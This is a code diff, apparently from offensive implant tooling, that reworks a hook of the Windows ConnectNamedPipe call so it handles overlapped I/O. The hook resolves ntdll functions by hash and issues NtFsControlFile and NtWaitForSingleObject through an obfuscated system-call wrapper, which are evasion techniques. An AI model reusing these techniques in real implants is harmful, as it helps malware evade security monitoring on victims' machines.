@@ -44,7 +44,10 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	API			Api;
 	IO_STATUS_BLOCK		Isb;
 
+	BOOLEAN			Ret = TRUE;
 	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;
+
+	PVOID			Apc = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
@@ -55,47 +58,68 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
 	Api.NtFsControlFile       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFSCONTROLFILE );
 
-	PVOID Ag1[] = {
-		C_PTR( hNamedPipe ),
-		C_PTR( NULL ),
-		C_PTR( NULL ),
-		C_PTR( NULL ),
-		C_PTR( &Isb ),
-		C_PTR( FSCTL_PIPE_LISTEN ),
-		C_PTR( NULL ),
-		C_PTR( 0 ),
-		C_PTR( NULL ),
-		C_PTR( 0 )
-	};
-	Nst = ObfSystemCall(
-		Api.NtFsControlFile,
-		Ag1,
-		ARRAYSIZE( Ag1 )
-	);
+	if ( lpOverlapped != NULL ) 
+	{
+		lpOverlapped->Internal = STATUS_PENDING;
+		Apc = C_PTR( U_PTR( U_PTR( lpOverlapped->hEvent ) & 0x1 ) ? NULL : lpOverlapped );
 
-	if ( Nst == STATUS_PENDING ) {
-		PVOID Ag2[] = {
+		PVOID Ag1[] = {
 			C_PTR( hNamedPipe ),
-			C_PTR( FALSE ),
-			C_PTR( NULL )
+			C_PTR( lpOverlapped->hEvent ),
+			C_PTR( NULL ),
+			C_PTR( Apc ),
+			C_PTR( lpOverlapped ),
+			C_PTR( FSCTL_PIPE_LISTEN ),
+			C_PTR( NULL ),
+			C_PTR( 0 ),
+			C_PTR( NULL ),
+			C_PTR( 0 )
 		};
-		Nst = ObfSystemCall(
-			Api.NtWaitForSingleObject,
-			Ag2,
-			ARRAYSIZE( Ag2 )
-		);
 
-		if ( NT_SUCCESS( Nst ) ) { 
-			Nst = Isb.Status;
+		Nst = ObfSystemCall( Api.NtFsControlFile, Ag1, ARRAYSIZE( Ag1 ) );
+
+		if ( ! NT_SUCCESS( Nst ) || Nst == STATUS_PENDING ) { 
+			Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
+			Ret = FALSE;
 		};
-	};
-	if ( ! NT_SUCCESS( Nst ) ) {
-		Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
+	} else {
+
+		PVOID Ag1[] = {
+			C_PTR( hNamedPipe ),
+			C_PTR( NULL ),
+			C_PTR( NULL ),
+			C_PTR( NULL ),
+			C_PTR( &Isb ),
+			C_PTR( FSCTL_PIPE_LISTEN ),
+			C_PTR( NULL ),
+			C_PTR( 0 ),
+			C_PTR( NULL ),
+			C_PTR( 0 )
+		};
+		Nst = ObfSystemCall( Api.NtFsControlFile, Ag1, ARRAYSIZE( Ag1 ) );
+
+		if ( Nst == STATUS_PENDING ) {
+
+			PVOID Ag2[] = {
+				C_PTR( hNamedPipe ),
+				C_PTR( FALSE ),
+				C_PTR( NULL )
+			};
+			Nst = ObfSystemCall( Api.NtWaitForSingleObject, Ag2, ARRAYSIZE( Ag2 ) );
+
+			if ( NT_SUCCESS( Nst ) ) { 
+				Nst = Isb.Status;
+			};
+		};
+		if ( ! NT_SUCCESS( Nst ) ) {
+			Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
+			Ret = FALSE;
+		};
 	};
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );
 
-	return NT_SUCCESS( Nst ) ? TRUE : FALSE;
+	return Ret;
 };
